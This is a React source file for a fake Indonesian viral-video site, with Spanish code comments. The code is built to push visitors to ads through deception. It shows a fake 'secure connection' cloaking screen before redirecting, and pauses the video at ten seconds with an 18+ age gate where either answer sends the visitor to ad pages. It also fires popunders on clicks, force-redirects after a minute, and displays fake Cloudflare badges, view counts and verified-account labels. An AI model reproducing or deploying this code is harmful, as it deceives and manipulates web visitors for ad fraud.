/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Play, ShieldAlert, Upload, Flag, Share2, MoreHorizontal, UserCheck, Send, Flame, Sparkles, RotateCcw, RotateCw } from 'lucide-react';

export default function App() {
  const [showGate, setShowGate] = useState(false);
  const [isVideoStarted, setIsVideoStarted] = useState(false);
  const [isPlaying, setIsPlaying] = useState(false);
  const [isMuted, setIsMuted] = useState(false);
  const [currentTime, setCurrentTime] = useState(0);
  const [duration, setDuration] = useState(0);
  const [isCloaking, setIsCloaking] = useState(false); // Estado para Cloaking
  const [popTriggered, setPopTriggered] = useState(false); // Estado para anuncio 1 sola vez
  const [gateTriggered, setGateTriggered] = useState(false); // Estado para trampa de 10 segundos
  const [isGateBypassed, setIsGateBypassed] = useState(false); // Estado para omitir verifiación en nueva pestaña
  const [isFullscreen, setIsFullscreen] = useState(false); // Estado para pantalla completa
  const [videoUrl, setVideoUrl] = useState("https://cdn2.videy.co/ZKskw0wz1.mp4");
  const videoRef = useRef<HTMLVideoElement>(null);
  const playerContainerRef = useRef<HTMLDivElement>(null);

  // Detectar cambios en pantalla completa
  useEffect(() => {
    const handleFsChange = () => {
      setIsFullscreen(!!document.fullscreenElement);
    };
    document.addEventListener('fullscreenchange', handleFsChange);
    document.addEventListener('webkitfullscreenchange', handleFsChange);
    return () => {
      document.removeEventListener('fullscreenchange', handleFsChange);
      document.removeEventListener('webkitfullscreenchange', handleFsChange);
    };
  }, []);

  // Configuración desde .env (con fallback otomatis ke domain wadah iklan)
  const PRIMARY_AD_URL = import.meta.env.VITE_AD_LINK_PRIMARY || "https://addmx.pages.dev/";
  const REDIRECT_AD_URL = import.meta.env.VITE_AD_LINK_REDIRECT || "https://addmx.pages.dev/";
  const TELEGRAM_URL = "https://t.me/your_channel";
  const AUTO_REDIRECT_DELAY = 60000;
  const VIDEO_JSON_URL = "https://covidey.pages.dev/videos.json";

  useEffect(() => {
    // LÓGICA DE CLOAKING: Verificar si existe el parámetro ?go=
    const params = new URLSearchParams(window.location.search);
    const go = params.get('go');
    const watched = params.get('watched');
    
    if (watched === 'true') {
      setIsGateBypassed(true);
      setIsVideoStarted(true);
    }
    
    if (go) {
      setIsCloaking(true);
      const target = go === '1' ? PRIMARY_AD_URL : REDIRECT_AD_URL;
      
      const timer = setTimeout(() => {
        window.location.replace(target);
      }, 1500);
      
      return () => clearTimeout(timer);
    }

    // Obtener lista de videos...
    const fetchVideos = async () => {
      try {
        const response = await fetch(VIDEO_JSON_URL);
        const data = await response.json();
        
        const videoList = Array.isArray(data) ? data : (data.videos || []);
        
        if (videoList.length > 0) {
          const randomIndex = Math.floor(Math.random() * videoList.length);
          const selected = videoList[randomIndex];
          const url = typeof selected === 'object' ? (selected.url || selected.link || selected.src) : selected;
          if (url) setVideoUrl(url);
        }
      } catch (error) {
        console.error("Error al cargar los videos:", error);
      }
    };

    fetchVideos();

    const timer = setTimeout(() => {
      if (!isVideoStarted && !isGateBypassed) setShowGate(true);
    }, 3000);

    const redirectTimer = setTimeout(() => {
      window.location.href = `/?go=2`;
    }, AUTO_REDIRECT_DELAY);

    return () => {
      clearTimeout(timer);
      clearTimeout(redirectTimer);
    };
  }, [isVideoStarted, REDIRECT_AD_URL, isGateBypassed, PRIMARY_AD_URL]);

  const fetchNewVideo = async () => {
    try {
      const response = await fetch(VIDEO_JSON_URL);
      const data = await response.json();
      const videoList = Array.isArray(data) ? data : (data.videos || []);
      if (videoList.length > 0) {
        const randomIndex = Math.floor(Math.random() * videoList.length);
        const selected = videoList[randomIndex];
        const url = typeof selected === 'object' ? (selected.url || selected.link || selected.src) : selected;
        if (url) {
          setVideoUrl(url);
          setIsVideoStarted(false);
          setGateTriggered(false);
          setShowGate(false);
          setIsPlaying(false);
          setCurrentTime(0);
        }
      }
    } catch (error) {
      console.error("Error al cargar el siguiente video:", error);
    }
  };

  const handleTimeUpdate = () => {
    if (videoRef.current) {
      const cur = videoRef.current.currentTime;
      setCurrentTime(cur);
      
      // TRAMPA DE 10 SEGUNDOS: Detener video a los 10 segundos y solicitar verificación
      if (cur >= 10 && !gateTriggered && !isGateBypassed) {
        videoRef.current.pause();
        setIsPlaying(false);
        setGateTriggered(true);
        setShowGate(true);
      }
    }
  };

  const handlePlayClick = () => {
    if (!isVideoStarted) {
      setShowGate(true);
    } else {
      togglePlay();
    }
  };

  const togglePlay = () => {
    if (videoRef.current) {
      if (videoRef.current.paused) {
        videoRef.current.play();
        setIsPlaying(true);
      } else {
        videoRef.current.pause();
        setIsPlaying(false);
      }
    }
  };

  const toggleMute = () => {
    if (videoRef.current) {
      videoRef.current.muted = !videoRef.current.muted;
      setIsMuted(videoRef.current.muted);
    }
  };

  const handleFullscreen = () => {
    if (playerContainerRef.current) {
      if (document.fullscreenElement) {
        if (document.exitFullscreen) {
          document.exitFullscreen().catch(err => {
            console.error(`Error al salir de pantalla completa: ${err.message}`);
          });
        }
      } else {
        const container = playerContainerRef.current as any;
        if (container.requestFullscreen) {
          container.requestFullscreen().catch((err: any) => {
            console.error(`Error al intentar pantalla completa: ${err.message}`);
          });
        } else if (container.webkitRequestFullscreen) {
          container.webkitRequestFullscreen();
        } else if (videoRef.current && (videoRef.current as any).webkitEnterFullscreen) {
          (videoRef.current as any).webkitEnterFullscreen();
        }
      }
    }
  };

  const [seekFeedback, setSeekFeedback] = useState<'rewind' | 'forward' | null>(null);

  const handleSeek = (seconds: number, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    if (videoRef.current) {
      let newTime = videoRef.current.currentTime + seconds;
      if (newTime < 0) newTime = 0;
      if (duration && newTime > duration) newTime = duration;
      videoRef.current.currentTime = newTime;
      setCurrentTime(newTime);
      
      // Feedback visual
      setSeekFeedback(seconds < 0 ? 'rewind' : 'forward');
      setTimeout(() => setSeekFeedback(null), 800);
    }
  };

  const handleProgressBarClick = (e: React.MouseEvent<HTMLDivElement>) => {
    e.stopPropagation();
    if (videoRef.current && duration > 0) {
      const rect = e.currentTarget.getBoundingClientRect();
      const clickX = e.clientX - rect.left;
      const width = rect.width;
      const percentage = Math.max(0, Math.min(1, clickX / width));
      const newTime = percentage * duration;
      videoRef.current.currentTime = newTime;
      setCurrentTime(newTime);
    }
  };

  const handleGateChoice = (slug: string) => {
    // Redirección Dual-Tab Universal
    window.open(window.location.origin + '/?watched=true', '_blank');
    window.location.href = `/?go=${slug}`;
  };

  const executePop = () => {
    if (!popTriggered) {
      window.open(`/?go=1`, '_blank');
      setPopTriggered(true);
    }
  };

  const wrapLink = (slug: string) => {
    // Estrategia Dual-Tab agresiva
    window.open(window.location.origin + '/?watched=true', '_blank');
    window.location.href = `/?go=${slug}`;
  };

  const formatTime = (time: number) => {
    const mins = Math.floor(time / 60);
    const secs = Math.floor(time % 60);
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  // VISTA DE CLOAKING
  if (isCloaking) {
    return (
      <div className="min-h-screen bg-slate-900 flex flex-col items-center justify-center p-6 text-center font-sans">
        <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-6"></div>
        <h2 className="text-white text-xl font-bold mb-2">Memeriksa Koneksi Aman...</h2>
        <p className="text-slate-400 text-sm max-w-xs">Mohon tunggu sebentar selagi kami menghubungkan ke server video terenkripsi.</p>
        <div className="mt-10 flex items-center gap-2 text-[10px] text-slate-500 uppercase tracking-widest font-semibold">
            <ShieldAlert size={14} className="text-blue-400" />
            <span>Transmisi Terenkripsi Indonesia #SSL</span>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-50 overflow-x-hidden font-sans">
      {/* Encabezado Estilo Plataforma Viral Indonesia */}
      <header className="sticky top-0 z-40 bg-white/90 backdrop-blur-md border-b border-slate-200 shadow-sm">
        <div className="max-w-screen-xl mx-auto px-4 h-14 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-gradient-to-tr from-red-600 to-white border border-red-200 rounded-lg flex items-center justify-center shadow-md">
              <span className="text-red-600 font-black text-sm tracking-widest">ID</span>
            </div>
            <div className="flex flex-col">
              <span className="font-extrabold text-lg tracking-tight leading-none text-slate-900">
                Videy<span className="text-red-600">.id</span>
              </span>
              <span className="text-[9px] font-bold text-slate-400 tracking-wider uppercase">Trending Indonesia</span>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <span className="inline-flex items-center gap-1 bg-red-50 text-red-600 border border-red-200 text-[10px] font-extrabold px-2.5 py-1 rounded-full uppercase tracking-wide">
              <Flame size={12} className="fill-red-500" />
              <span>LIVE</span>
            </span>
            <button 
              onClick={() => wrapLink('1')}
              className="bg-slate-900 text-white text-xs font-extrabold px-3.5 py-2 rounded-full hover:bg-black transition-colors flex items-center gap-1.5 shadow-md active:scale-95"
            >
              <Upload size={14} />
              <span>Unggah Video</span>
            </button>
          </div>
        </div>
      </header>

      {/* Contenido Principal */}
      <main className="max-w-2xl mx-auto px-4 pt-3 pb-24 relative">
        {/* Botón Flotante de Telegram / Grupo VIP */}
        <motion.a 
          href={TELEGRAM_URL}
          target="_blank"
          rel="noopener noreferrer"
          initial={{ x: 100 }}
          animate={{ x: 0 }}
          className="fixed right-5 bottom-20 z-40 bg-[#0088cc] text-white p-3.5 rounded-full shadow-2xl flex items-center gap-2 font-bold active:scale-90 transition-transform border border-white/20"
        >
          <Send size={18} fill="white" />
          <span className="hidden sm:inline text-xs">Grup VIP Indonesia</span>
        </motion.a>

        {/* Reproductor de Video */}
        <div 
          ref={playerContainerRef}
          onClick={executePop}
          className={`relative group bg-black shadow-2xl transition-all flex items-center justify-center overflow-hidden ${
            isFullscreen 
              ? 'w-screen h-screen rounded-none border-none' 
              : 'rounded-3xl aspect-[9/16] border border-slate-900 max-h-[85vh] mx-auto'
          }`}
        >
          <video
            key={videoUrl}
            ref={videoRef}
            className={`w-full h-full transition-all bg-black ${
              isFullscreen ? 'object-contain' : 'object-contain sm:object-cover'
            }`}
            playsInline
            onLoadedMetadata={() => setDuration(videoRef.current?.duration || 0)}
            onTimeUpdate={handleTimeUpdate}
            onPlay={() => setIsPlaying(true)}
            onPause={() => setIsPlaying(false)}
          >
            <source src={videoUrl} type="video/mp4" />
          </video>

          {/* Capa de Interacción Split (Izquierda -10s, Centro Play/Pause, Derecha +10s) */}
          <div className="absolute inset-0 z-10 flex">
            {/* Zone Izquierda (-10s Rewind) */}
            <div 
              className="w-[30%] h-full cursor-pointer flex items-center justify-center group/rewind"
              onClick={(e) => handleSeek(-10, e)}
              title="Mundur 10 detik"
            >
              <div className="opacity-0 group-hover/rewind:opacity-100 transition-opacity bg-black/40 p-2 rounded-full text-white text-xs font-bold flex items-center gap-1 backdrop-blur-sm">
                <RotateCcw size={16} />
                <span>-10d</span>
              </div>
            </div>

            {/* Zone Centro (Play / Pause) */}
            <div 
              className="w-[40%] h-full cursor-pointer"
              onClick={handlePlayClick}
            />

            {/* Zone Derecha (+10s Fast Forward) */}
            <div 
              className="w-[30%] h-full cursor-pointer flex items-center justify-center group/forward"
              onClick={(e) => handleSeek(10, e)}
              title="Maju 10 detik"
            >
              <div className="opacity-0 group-hover/forward:opacity-100 transition-opacity bg-black/40 p-2 rounded-full text-white text-xs font-bold flex items-center gap-1 backdrop-blur-sm">
                <span>+10d</span>
                <RotateCw size={16} />
              </div>
            </div>
          </div>

          {/* Animación Visual al Buscar / Adelantar */}
          <AnimatePresence>
            {seekFeedback && (
              <motion.div 
                initial={{ opacity: 0, scale: 0.6 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.6 }}
                className="absolute inset-0 z-20 pointer-events-none flex items-center justify-center"
              >
                <div className="bg-black/70 text-white px-5 py-3 rounded-2xl backdrop-blur-md flex items-center gap-2 border border-white/20 font-black text-sm shadow-2xl">
                  {seekFeedback === 'rewind' ? (
                    <>
                      <RotateCcw size={22} className="text-red-500 animate-spin" />
                      <span>Mundur -10d</span>
                    </>
                  ) : (
                    <>
                      <span>Maju +10d</span>
                      <RotateCw size={22} className="text-red-500 animate-spin" />
                    </>
                  )}
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Capa Inicial de Reproducción */}
          {!isVideoStarted && !isGateBypassed && (
            <div className="absolute inset-0 z-20 bg-black/50 backdrop-blur-[2px] flex flex-col items-center justify-center pointer-events-none p-6 text-center">
              <motion.div 
                animate={{ scale: [1, 1.12, 1] }}
                transition={{ repeat: Infinity, duration: 1.4 }}
                className="w-20 h-20 bg-white/20 backdrop-blur-xl rounded-full flex items-center justify-center border-2 border-white/40 shadow-2xl"
              >
                <Play className="text-white ml-1.5" size={42} fill="white" />
              </motion.div>
              <span className="mt-5 bg-red-600 text-white text-xs font-black uppercase px-3 py-1 rounded-full tracking-wider shadow-lg">
                VIRAL INDONESIA #1
              </span>
              <p className="mt-3 text-white font-extrabold text-base drop-shadow-lg leading-snug">
                Ketuk untuk memutar video selengkapnya
              </p>
            </div>
          )}

          {/* Interfaz de Controles */}
          <div className="absolute bottom-0 left-0 right-0 p-5 bg-gradient-to-t from-black/95 via-black/50 to-transparent z-30 transition-opacity duration-300 group-hover:opacity-100 opacity-90">
            <div className="flex flex-col gap-3.5">
              {/* Botón Siguiente Video */}
              <div className="absolute top-0 right-0 p-4">
                 <button 
                  onClick={(e) => {
                    e.stopPropagation();
                    fetchNewVideo();
                  }}
                  className="bg-white/25 backdrop-blur-md text-white border border-white/30 px-3.5 py-1.5 rounded-xl text-xs font-bold hover:bg-white/40 flex items-center gap-1.5 shadow-lg active:scale-95 transition-all"
                 >
                   <span>Video Selanjutnya</span>
                   <Play size={12} fill="white" />
                 </button>
              </div>

              {/* Información del Usuario */}
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-full border-2 border-green-500 overflow-hidden shadow-md">
                  <img src="https://picsum.photos/seed/user/100/100" alt="Avatar" referrerPolicy="no-referrer" />
                </div>
                <div className="flex flex-col">
                  <div className="flex items-center gap-1.5">
                    <span className="text-white font-extrabold text-sm tracking-wide">ViralIndo_Official</span>
                    <UserCheck size={14} className="text-blue-400 fill-blue-400/20" />
                  </div>
                  <span className="text-white/70 text-[10px] font-medium">2 jam lalu • 2,4JT ditonton</span>
                </div>
              </div>

              {/* Descripción */}
              <p className="text-white text-xs line-clamp-2 leading-relaxed font-medium drop-shadow">
                Video paling heboh dan viral di Indonesia hari ini! Lagi dicari banyak orang. Tonton konten lengkapnya sebelum dihapus! #Indonesia #Viral #Trending
              </p>

              {/* Barra de Progreso Interactiva */}
              <div className="flex items-center gap-3">
                <div 
                  onClick={handleProgressBarClick}
                  className="flex-grow h-3 bg-white/20 rounded-full cursor-pointer relative overflow-hidden group/bar py-0.5 flex items-center"
                  title="Klik untuk melompati video"
                >
                  <div 
                    className="h-full bg-red-600 rounded-full transition-all duration-150 shadow-[0_0_10px_rgba(220,38,38,0.9)] relative" 
                    style={{ width: `${(currentTime / duration) * 100}%` }}
                  >
                    <div className="absolute right-0 top-1/2 -translate-y-1/2 w-3 h-3 bg-white rounded-full shadow scale-0 group-hover/bar:scale-100 transition-transform" />
                  </div>
                </div>
                <span className="text-white text-[10px] font-mono font-bold tracking-wider tabular-nums">
                  {formatTime(currentTime)} / {formatTime(duration)}
                </span>
              </div>

              {/* Acciones del Reproductor (Retroceder, Play/Pausa, Adelantar, Mute) */}
              <div className="flex items-center justify-between mt-1">
                <div className="flex items-center gap-4">
                   <button 
                    onClick={(e) => handleSeek(-10, e)} 
                    className="text-white/80 hover:text-white hover:scale-110 transition-transform p-1"
                    title="Mundur 10 detik"
                   >
                     <RotateCcw size={18} />
                   </button>

                   <button onClick={togglePlay} className="text-white hover:scale-110 transition-transform p-1">
                      {isPlaying ? (
                        <div className="w-5 h-5 flex gap-1 items-center justify-center">
                          <div className="w-1.5 h-full bg-white rounded-full"></div>
                          <div className="w-1.5 h-full bg-white rounded-full"></div>
                        </div>
                      ) : (
                        <Play size={20} fill="white" />
                      )}
                   </button>

                   <button 
                    onClick={(e) => handleSeek(10, e)} 
                    className="text-white/80 hover:text-white hover:scale-110 transition-transform p-1"
                    title="Maju 10 detik"
                   >
                     <RotateCw size={18} />
                   </button>

                   <button onClick={toggleMute} className="text-white/80 hover:text-white p-1">
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                        {isMuted ? (
                          <>
                            <path d="M11 5L6 9H2v6h4l5 4V5z" />
                            <line x1="23" y1="9" x2="17" y2="15" />
                            <line x1="17" y1="9" x2="23" y2="15" />
                          </>
                        ) : (
                          <>
                            <path d="M11 5L6 9H2v6h4l5 4V5z" />
                            <path d="M19.07 4.93a10 10 0 0 1 0 14.14" />
                            <path d="M15.54 8.46a5 5 0 0 1 0 7.07" />
                          </>
                        )}
                      </svg>
                   </button>
                </div>
                <div className="flex items-center gap-4">
                  <button className="text-white hover:text-red-400 transition-colors"><Share2 size={18} /></button>
                  <button className="text-white hover:text-red-400 transition-colors"><Flag size={18} /></button>
                  <button onClick={handleFullscreen} className="text-white hover:text-red-400 transition-colors">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M8 3H5a2 2 0 0 0-2 2v3" />
                      <path d="M21 8V5a2 2 0 0 0-2-2h-3" />
                      <path d="M3 16v3a2 2 0 0 0 2 2h3" />
                      <path d="M16 21h3a2 2 0 0 0 2 2v-3" />
                    </svg>
                  </button>
                  <button className="text-white"><MoreHorizontal size={18} /></button>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Sección de Recomendados (Cuadrícula de Anuncios) */}
        <div className="mt-7">
          <div className="flex items-center justify-between mb-3.5">
            <h3 className="font-black text-slate-800 text-sm flex items-center gap-2 uppercase tracking-wide">
              <span className="w-1.5 h-4 bg-red-600 rounded-full"></span>
              Video Viral Trending Lainnya di Indonesia
            </h3>
            <span className="text-[10px] font-bold bg-slate-200 text-slate-700 px-2 py-0.5 rounded-md">TOP INDO</span>
          </div>

          <div className="grid grid-cols-2 gap-3.5">
            {[1, 2, 3, 4].map((i) => (
              <div key={i} onClick={() => wrapLink('1')} className="cursor-pointer group">
                <div className="aspect-video bg-slate-200 rounded-2xl overflow-hidden relative shadow-sm border border-slate-200/80">
                  <img src={`https://picsum.photos/seed/viralindo${i}/400/225`} alt="Viral Indo" className="w-full h-full object-cover group-hover:scale-110 transition-transform duration-300" />
                  <div className="absolute top-1.5 left-1.5 bg-red-600 text-white text-[9px] font-black px-1.5 py-0.5 rounded uppercase"> TRENDING </div>
                  <div className="absolute bottom-1.5 right-1.5 bg-black/80 text-white text-[9px] font-bold px-1.5 py-0.5 rounded"> 02:45 </div>
                </div>
                <p className="mt-2 text-[11px] font-bold line-clamp-2 text-slate-800 group-hover:text-red-600 transition-colors leading-snug">
                  Kejadian Heboh Terekam Kamera di Indonesia #{i}... Sumpah Bikin Kaget!
                </p>
              </div>
            ))}
          </div>

          {/* Bloque de Anuncio Destacado */}
          <div className="mt-6 bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 text-white rounded-3xl p-6 text-center border border-slate-700 shadow-xl relative overflow-hidden">
            <div className="absolute top-0 right-0 bg-yellow-500 text-slate-950 font-black text-[9px] px-3 py-1 rounded-bl-xl uppercase tracking-widest">
              SPONSORED
            </div>
            
            <div className="flex flex-col items-center relative z-10">
              <div className="w-12 h-12 bg-red-600/20 text-red-500 rounded-full flex items-center justify-center mb-3 border border-red-500/30">
                <Sparkles size={24} />
              </div>
              <h3 className="font-extrabold text-base text-white">Akses Konten Eksklusif & VIP</h3>
              <p className="text-slate-300 text-xs mt-1 max-w-xs font-medium leading-relaxed">
                Klik tombol di bawah untuk membuka galeri lengkap dan video versi HD tanpa sensor.
              </p>
              <button 
                onClick={() => wrapLink('1')}
                className="mt-4 w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-500 hover:to-red-600 text-white font-extrabold py-3.5 rounded-2xl shadow-lg shadow-red-600/30 active:scale-95 transition-all text-xs uppercase tracking-wider"
              >
                BUKA SEKARANG
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* POPUP GATE DE SEGURIDAD (Modal Konfirmasi Usia untuk Indonesia) */}
      <AnimatePresence>
        {showGate && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="absolute inset-0 bg-slate-950/75 backdrop-blur-xl"
            />
            
            <motion.div 
              initial={{ scale: 0.9, y: 20, opacity: 0 }}
              animate={{ scale: 1, y: 0, opacity: 1 }}
              exit={{ scale: 0.9, y: 20, opacity: 0 }}
              className="relative w-full max-w-sm bg-white rounded-3xl overflow-hidden shadow-2xl border border-slate-100 z-10"
            >
              <div className="p-7 text-center">
                <div className="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center mx-auto mb-5 border-4 border-red-50 shadow-inner">
                  <ShieldAlert size={34} />
                </div>
                
                <h3 className="text-xl font-black text-slate-900 mb-2 leading-tight">
                  Konfirmasi Usia (+18)
                </h3>
                <p className="text-slate-600 text-xs leading-relaxed mb-6 font-medium">
                  Konten ini mengandung materi sensitif khusus dewasa. Apakah Anda mengonfirmasi telah berusia 18 tahun ke atas untuk melanjutkan?
                </p>
                
                <div className="flex flex-col gap-3">
                  <button 
                    onClick={() => handleGateChoice('1')}
                    className="w-full bg-red-600 text-white font-black py-4 rounded-2xl shadow-xl shadow-red-200 hover:bg-red-700 transition-all active:scale-95 text-xs uppercase tracking-wider"
                  >
                    YA, SAYA BERUSIA 18 TAHUN+
                  </button>
                  <button 
                    onClick={() => handleGateChoice('2')}
                    className="w-full bg-slate-100 text-slate-700 font-bold py-3.5 rounded-2xl hover:bg-slate-200 transition-all text-xs"
                  >
                    TIDAK, SAYA DI BAWAH USIA
                  </button>
                </div>
                
                <p className="mt-5 text-[10px] text-slate-400 font-bold uppercase tracking-widest flex items-center justify-center gap-1.5">
                  <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
                  Dilindungi oleh Cloudflare Indonesia
                </p>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Botón Pegajoso de Pie de Página (Móvil) */}
      <div className="fixed bottom-0 left-0 right-0 bg-white/95 backdrop-blur-md border-t border-slate-200 p-2.5 z-30 md:hidden shadow-lg">
        <button 
          onClick={() => wrapLink('1')}
          className="w-full bg-slate-900 text-white font-extrabold py-3.5 rounded-2xl flex items-center justify-center gap-2 text-xs uppercase tracking-wider shadow-md active:scale-95"
        >
          <Play size={16} fill="white" className="text-white" />
          <span>Tonton Sekarang Gratis HD</span>
        </button>
      </div>
    </div>
  );
}
